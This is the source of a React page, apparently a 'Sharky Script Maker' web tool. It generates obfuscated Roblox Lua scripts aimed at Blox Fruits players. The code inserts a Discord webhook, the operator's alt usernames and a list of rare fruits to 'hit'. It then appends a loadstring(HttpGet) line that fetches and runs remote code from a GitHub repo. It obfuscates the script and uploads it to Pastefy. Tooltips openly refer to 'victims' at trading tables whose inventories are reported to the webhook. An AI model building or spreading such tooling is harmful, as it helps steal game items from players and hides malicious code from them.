'use client';

import {useState, useEffect, useRef} from 'react';
import {Button} from '@/components/ui/button';
import {Textarea} from '@/components/ui/textarea';
import {Checkbox} from '@/components/ui/checkbox';
import {Label} from '@/components/ui/label';
import {Input} from '@/components/ui/input';
import {Download, Copy, HelpCircle} from 'lucide-react';
import {useToast} from '@/hooks/use-toast';

import {useTransition} from 'react';
import {obfuscateScript} from '@/ai/flows/obfuscate-script';

import ParticleComponent from '@/components/ParticleComponent';

import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip"
import {useIsMobile} from "@/hooks/use-mobile";


const mythicalFruits = [
  'Kitsune-Kitsune',
  'Yeti-Yeti',
  'Gas-Gas',
  'Leopard-Leopard',
  'Control-Control',
  'Dough-Dough',
  'T-Rex-T-Rex',
  'Spirit-Spirit',
  'Mammoth-Mammoth',
  'Venom-Venom',
];
const legendaryFruits = [
  'Portal-Portal',
  'Buddha-Buddha',
  'Rumble-Rumble',
  'Shadow-Shadow',
  'Blizzard-Blizzard',
  'Sound-Sound',
  'Phoenix-Phoenix',
  'Pain-Pain',
  'Gravity-Gravity',
  'Love-Love',
  'Spider-Spider',
  'Quake-Quake',
];
const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];

export default function Home() {
  const [webhookUrl, setWebhookUrl] = useState('');
  const [usernames, setUsernames] = useState('');
  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
  const [configuredScript, setConfiguredScript] = useState('');
  const [obfuscatedScript, setObfuscatedScript] = useState('');
  const [pastefyLink, setPastefyLink] = useState('');
  const {toast} = useToast();
  const [isPending, startTransition] = useTransition();
    const isMobile = useIsMobile();
    const [tooltipStates, setTooltipStates] = useState({
        webhookUrl: false,
        usernames: false,
        fruitsToHit: false,
    });

    const toggleTooltip = (field: string) => {
        if (isMobile) {
            setTooltipStates(prevState => ({
                ...Object.fromEntries(
                    Object.keys(prevState).map(key => [key, false])
                ),
                [field]: !prevState[field],
            }));
        }
    };

  const isGenerating = isPending;

  const generateScript = async () => {
    try {
      let script = `Webhook = "${webhookUrl}" -- << Discord Webhook Here\n`;
      script += `Usernames = {${usernames
        .split('\n')
        .map(user => `"${user}"`)
        .join(', ')}} -- << Your usernames here, you can add as many alts as you want\n`;
      script += `FruitsToHit = {${selectedFruits.map(fruit => `"${fruit}"`).join(', ')}} -- << Fruits you want the script to detect\n`;
      script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;

      setConfiguredScript(script);
      // Obfuscate the script using the Genkit flow
      startTransition(async () => {
        try {
          const obfuscationResult = await obfuscateScript({script: script});
          setObfuscatedScript(obfuscationResult.obfuscatedScript);
          setPastefyLink(obfuscationResult.pastefyLink);

          toast({
            title: 'Script Generated!',
            description: 'Script generated and obfuscated successfully.',
          });
        } catch (error: any) {
          console.error("Error during obfuscation:", error);
          toast({
            title: 'Error',
            description: `Failed to generate script: ${error.message}`,
            variant: 'destructive',
          });
        }
      });
    } catch (error: any) {
      toast({
        title: 'Error',
        description: `Failed to generate script: ${error.message}`,
        variant: 'destructive',
      });
    }
  };

  const handleFruitSelect = (fruit: string) => {
    setSelectedFruits(prev => {
      if (prev.includes(fruit)) {
        return prev.filter(f => f !== fruit);
      } else {
        return [...prev, fruit];
      }
    });
  };

  const downloadScript = () => {
    if (!obfuscatedScript) {
      toast({
        title: 'Error',
        description: 'Please generate a script first.',
        variant: 'destructive',
      });
      return;
    }

    const blob = new Blob([obfuscatedScript], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = 'roblox_script.lua';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const copyConfiguredScript = async () => {
    if (configuredScript) {
      await navigator.clipboard.writeText(configuredScript);
      toast({
        title: 'Copied!',
        description: 'Configured script copied to clipboard.',
      });
    } else {
      toast({
        title: 'Error',
        description: 'No configured script to copy.',
        variant: 'destructive',
      });
    }
  };

  const copyObfuscatedScript = async () => {
    if (obfuscatedScript) {
      await navigator.clipboard.writeText(obfuscatedScript);
      toast({
        title: 'Copied!',
        description: 'Obfuscated script copied to clipboard.',
      });
    } else {
      toast({
        title: 'Error',
        description: 'No obfuscated script to copy.',
        variant: 'destructive',
      });
    }
  };

  return (
    <>
      <ParticleComponent />
      <div className="flex flex-col items-center justify-center min-h-screen p-4 neon-text">
        {' '}
        {/* Added neon-text class here */}
        <div className="container mx-auto max-w-3xl w-full">
          <h1 className="text-2xl font-bold mb-4 text-center">Sharky Script Maker</h1>
          <div className="mb-4">
            <div className="flex items-center space-x-2">
                <Label htmlFor="webhookUrl">Discord Webhook URL</Label>
                <TooltipProvider>
                  <Tooltip
                    open={tooltipStates.webhookUrl}
                    onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}
                  >
                    <TooltipTrigger asChild>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => {
                          if (isMobile) {
                            toggleTooltip('webhookUrl');
                          }
                        }}
                      >
                        <HelpCircle className="h-4 w-4" />
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
                      <ul>
                        <li>Enter your <b>Discord Webhook URL</b> to receive notifications when the script detects a fruit.</li>
                        <li>The webhook URL should be a valid Discord webhook URL.</li>
                        <li>This allows the script to send messages to your Discord channel.</li>
                      </ul>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>
              </div>
            <Input
              type="text"
              id="webhookUrl"
              value={webhookUrl}
              onChange={e => setWebhookUrl(e.target.value)}
              placeholder="Enter your Discord Webhook URL"
              className="w-full"
            />
          </div>
          <div className="mb-4">
              <div className="flex items-center space-x-2">
                <Label htmlFor="usernames">Usernames (one per line)</Label>
                  <TooltipProvider>
                    <Tooltip
                      open={tooltipStates.usernames}
                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, usernames: open })}
                    >
                      <TooltipTrigger asChild>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() => {
                            if (isMobile) {
                              toggleTooltip('usernames');
                            }
                          }}
                        >
                          <HelpCircle className="h-4 w-4" />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
                         <ul>
                            <li>Enter usernames of <b>YOUR</b> accounts.</li>
                            <li>These will be the accounts that can use the script's commands.</li>
                            <li>They will also be the ones sitting in trading tables with victims.</li>
                            <li>Put one Roblox username per line, with <b>no spaces</b>.</li>
                          </ul>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
              </div>
            <Textarea
              id="usernames"
              value={usernames}
              onChange={e => setUsernames(e.target.value)}
              placeholder="Enter usernames, one per line"
              className="w-full"
              style={{fontFamily: 'Roboto Mono, monospace'}} // Added monospaced font
            />
          </div>
          <div className="mb-4">
              <div className="flex items-center space-x-2">
                <Label>Fruits to Hit</Label>
                 <TooltipProvider>
                   <Tooltip
                     open={tooltipStates.fruitsToHit}
                     onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
                   >
                     <TooltipTrigger asChild>
                       <Button
                         variant="ghost"
                         size="icon"
                         onClick={() => {
                           if (isMobile) {
                             toggleTooltip('fruitsToHit');
                           }
                         }}
                       >
                         <HelpCircle className="h-4 w-4" />
                       </Button>
                     </TooltipTrigger>
                     <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
                        <ul>
                          <li>Select the fruits you want the script to detect.</li>
                          <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
                        </ul>
                     </TooltipContent>
                   </Tooltip>
                 </TooltipProvider>
              </div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
              {sortedFruitsByRarity.map(fruit => (
                <div key={fruit} className="flex items-center space-x-2">
                 <label
                    htmlFor={fruit}
                    className="flex items-center space-x-2 cursor-pointer"
                  >
                    <Checkbox
                      id={fruit}
                      checked={selectedFruits.includes(fruit)}
                      onCheckedChange={() => handleFruitSelect(fruit)}
                    />
                    <span>{fruit}</span>
                  </label>
                </div>
              ))}
            </div>
          </div>
          <div className="mb-4">
            <Button onClick={generateScript} className="generate-button" disabled={isGenerating}>
              {isGenerating ? 'Generating...' : 'Generate Script'}
            </Button>
          </div>
          {configuredScript && (
            <div className="mb-4">
              <Label>Configured Script</Label>
              <div className="relative">
                <Textarea
                  value={configuredScript}
                  readOnly
                  className="w-full"
                  style={{
                    fontFamily: 'Roboto Mono, monospace',
                    opacity: 0.7,
                  }}
                />
                <Button
                  onClick={copyConfiguredScript}
                  className="absolute right-2 top-2 bg-secondary text-secondary-foreground hover:bg-secondary/80 rounded-md shadow-md"
                  size="icon">
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </div>
          )}
          {obfuscatedScript && (
            <div className="mb-4">
              <Label>Obfuscated Script</Label>
              {pastefyLink && (
                <div className="mb-2">
                  <Label>Pastefy Link:</Label>
                  <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-accent underline">
                    {pastefyLink}
                  </a>
                </div>
              )}
              <div className="relative">
                <Textarea
                  value={obfuscatedScript}
                  readOnly
                  className="w-full"
                  style={{
                    fontFamily: 'Roboto Mono, monospace',
                    opacity: 0.7,
                  }}
                />
                <Button
                  onClick={copyObfuscatedScript}
                  className="absolute right-2 top-2 bg-secondary text-secondary-foreground hover:bg-secondary/80 rounded-md shadow-md"
                  size="icon">
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </div>
          )}
          <Button
            onClick={downloadScript}
            className="download-button"
            disabled={!obfuscatedScript}>
            <Download className="mr-2 h-4 w-4" />
            Download Script
          </Button>
        </div>
      </div>
    </>
  );
}

